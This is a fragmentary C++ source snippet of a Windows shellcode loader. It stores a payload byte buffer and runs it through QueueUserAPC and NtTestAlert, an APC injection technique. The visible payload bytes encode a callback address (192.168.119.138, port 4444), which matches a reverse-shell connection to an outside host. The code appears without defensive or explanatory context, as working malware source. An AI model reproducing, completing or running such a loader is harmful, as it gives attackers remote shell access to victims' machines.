...
typedef NTSTATUS(WINAPI *myNtTestAlert)();  // Declare myNtTestAlert as a function pointer type
...
int main()
{
    unsigned char buf[] =
        ...
        "\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x77\x8a\x41\x54"
    ...
    QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), 0);  // Changed NULL to 0
    if (testAlert) {
        testAlert();
    } else {
        std::cerr << "Failed to retrieve NtTestAlert function.\n";
    }
